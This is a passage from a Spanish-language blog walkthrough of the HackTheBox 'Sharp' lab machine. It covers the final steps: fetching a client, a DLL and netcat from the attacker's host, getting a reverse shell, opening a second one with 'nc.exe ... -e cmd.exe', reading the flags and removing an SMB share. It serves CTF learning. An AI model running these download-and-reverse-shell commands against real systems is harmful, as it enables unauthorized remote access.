<pre><code class="language-powershell">PS C:\Users\lars\Videos&gt; IWR -uri http://10.10.14.34:8000/WcfClient.exe -OutFile c:\Users\lars\Videos\WcfClient.exe
PS C:\Users\lars\Videos&gt; IWR -uri http://10.10.14.34:8000/WcfRemotingLibrary.dll -OutFile c:\Users\lars\Videos\WcfRemotingLibrary.dll
PS C:\Users\lars\Videos&gt; ls

    Directory: C:\Users\lars\Videos

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/9/2021   1:11 AM           5120 WcfClient.exe
-a----         2/9/2021   1:11 AM           7680 WcfRemotingLibrary.dll
</code></pre>

<p>Y ejecutamos el binario:</p>

<pre><code class="language-powershell">PS C:\Users\lars\Videos&gt; .\WcfClient.exe
...
</code></pre>

<p>Salen errores, peeeeeeeeeeerooooooooooooooooooooooooooooooooooooooooo:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_wcfclient_revshDONE.png" alt="303win_cmd_wcfclient_revshDONE" /></p>

<p>Nicceeeeeeeeeeeeeeeeeeeeeeeeeeeeee, tamos dentro paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai!!</p>

<p>Veamos las flags.</p>

<p>Bueno, a√∫n no, la sesi√≥n se cierra r√°pido, intentemos subir el binario <code>nc</code> para r√°pidamente generar otra Reverse Shell separada del proceso que tiene el <code>WcfClient.exe</code>:</p>

<pre><code class="language-powershell">PS C:\Users\lars\Videos&gt; IWR -uri http://10.10.14.34:8000/nc64.exe -OutFile c:\Users\lars\Videos\nc.exe
</code></pre>

<p>Ejecutamos de nuevo el binario <code>.\WcfClient.exe</code> y apenas tengamos la Shell por el puerto <code>4435</code>, generamos otra por el <code>4436</code> (nos ponemos en escucha):</p>

<pre><code class="language-powershell">PS C:\Windows\system32&gt; c:\Users\lars\Videos\nc.exe 10.10.14.34 4436 -e cmd.exe
</code></pre>

<p>Ahora si veamos las flags:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_flags.png" alt="303win_flags" /></p>

<p>Antes de irnos, cerremos la unidad <code>Z:</code> que hab√≠amos abierto para compartirnos el archivo comprimido:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; net use
No se recordar√°n las nuevas conexiones.

Estado       Local     Remoto                    Red

-------------------------------------------------------------------------------
Conectado    Z:        \\10.10.10.219\dev        Microsoft Windows Network
Se ha completado el comando correctamente.
</code></pre>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; net use Z: /delete
Hay archivos abiertos y/o b√∫squedas incompletas de directorios pendientes en la conexi√≥n con Z:.

¬øDesea continuar la desconexi√≥n y forzar el cierre? (S/N) [N]: S
Z: se ha eliminado.

PS C:\htb_sharp\files&gt; net use
No se recordar√°n las nuevas conexiones.

No hay entradas en la lista.

PS C:\htb_sharp\files&gt;
</code></pre>

<p>Ahora seeee.</p>

<p>‚Ä¶</p>

<p>Hemo acabao‚Äô como siempre, muchas gracias por leer y nos veremos en otro writeup ;) A ROMPER TODOOOOOOOOOOOO!</p>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       


<!-- Share -->
<div class="share">
    <p>
        Vacios
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Sharp&url=http://localhost:4000/htb/sharp" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#crypto">crypto</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#dnSpy">dnSpy</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#visual-studio">visual-studio</a>               
    
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/resolute">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" alt="HackTheBox - Resolute"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/resolute">HackTheBox - Resolute</a>
                
            </h2>
            <h4 class="card-text">M√°quina Windows nivel medio. Enumeraremos hasta m√°s no poder un controlador de dominio, veremos contrase√±as volando libremente e inyectaremos una DLL maliciosa en un servidor DNS üò≤

</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">14 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/crimestoppers">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
                
            </h2>
            <h4 class="card-text">M√°quina Linux nivel dif√≠cil. Explotaci√≥n web con filtros (wrappers) consiguiendo LFI y RCE, contrase√±as de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptograf√≠a....</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">08 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/atom">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/atom">HackTheBox - Atom</a>
                
            </h2>
            <h4 class="card-text">M√°quina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relaci√≥n amorosa entre Redis...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">10 Jul 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
                
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ================================================== -->
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
        <p></p>
    </div>
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright ¬© 2022 Sh0x blog 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
